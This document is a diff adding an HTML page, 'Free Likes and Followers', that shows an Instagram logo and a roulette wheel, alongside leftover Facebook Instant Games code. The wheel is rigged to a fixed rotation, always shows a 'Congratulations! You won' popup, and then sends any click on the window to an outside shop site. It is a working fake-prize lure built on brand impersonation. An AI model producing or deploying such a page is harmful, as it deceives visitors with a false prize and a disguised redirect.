@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>Free Likes and Followers</title>
+  <link rel="stylesheet" href="main.css" type="text/css" />
+  <script src="https://connect.facebook.net/en_US/fbinstant.6.2.js"></script>
+  <script> 
+
+
+      window.onload = function() {
+      FBInstant.initializeAsync().then(function() {
+        FBInstant.setLoadingProgress(100)
+   
+        FBInstant.startGameAsync().then(function() {
+          startGame();          
+        });
+
+      });
+    };
+
+    function selectContext() {
+      FBInstant.context.chooseAsync()
+        .then(function() {
+            startGame();          
+        })
+    }
+
+    function startGame() {
+    
+      let game = new Roulette.Game();
+    App.Global.game = game;
+    
+    }
+
+
+
+//       window.onload = function() {
+
+//      if (App.Global.FBINSTANT) {
+//         // check if FB Instant is present
+//         if (FBInstant == null) {
+//             App.Global.FBINSTANT = false;
+//             startGame();
+//             return;
+//         }
+
+//         // FB Instant
+//         console.log("FB initializeAsync called");
+
+//         FBInstant.initializeAsync().then(function () {
+//             console.log("FB initializeAsync completed");
+//             startGame();
+//         }).catch(function (e) {
+//             // FBInstant failed to initialize - switch off FBINSTANT setting and start standard game
+//             console.log("FB initializeAsync failed - fallback to standard game. Error: " + e.code + ": " + e.message);
+//             App.Global.FBINSTANT = false;
+//             startGame();
+//         });
+
+//     } else {
+//         // Standard game
+//         startGame(); 
+//     }
+// };
+
+// -------------------------------------------------------------------------
+// function startGame() {
+//     let game = new Roulette.Game();
+//     App.Global.game = game;
+
+//     return game;
+// }
+</script>
+</head>
+
+<body>
+  <div class="overlay"></div>
+  <div class="wrapper">
+    <img src="instlogo.svg" alt="instagram logo">
+
+    <div class="image-container">
+
+      <div id="image"></div>
+    </div>
+    <a href="#" id="spin_button">TRY YOUR LUCK!</a>
+    <dialog id="popUp">
+      <form method="dialog">
+
+        <h2>Congratulations!<br> You won </h2>
+        <div id="prize"></div>
+        <button type="submit" id="take-win">TAKE MY WIN</button>
+
+      </form>
+
+    </dialog>
+
+  </div>
+  <script type="text/javascript">
+    var lastRotate = 0,
+      btn = document.getElementById('spin_button'),
+      popUp = document.getElementById('popUp'),
+      img = document.getElementById('image'),
+      flag = 0,
+      section;
+
+
+
+    function showPopUp() {
+      popUp.showModal();
+      document.querySelector('.overlay').style.display = "block";
+      window.addEventListener('click', function(e) {
+        location = "http://instashop.today";
+
+      })
+    }
+
+    function makeTransform(deg) {
+
+      img.style.moz = 'rotate(' + deg + 'deg)';
+      img.style.webkitTransform = 'rotate(' + deg + 'deg)';
+      img.style.transform = 'rotate(' + deg + 'deg)';
+
+    }
+
+
+    btn.addEventListener('click', function(e) {
+      e.preventDefault();
+      flag++;
+      var randomVal = 2575;
+      lastRotate += randomVal;
+      img.style.transform = makeTransform((lastRotate));
+      btn.style.display = "none";
+      setTimeout(showPopUp, 5000);
+
+    });
+  </script>
+
+</body>
+
+</html>
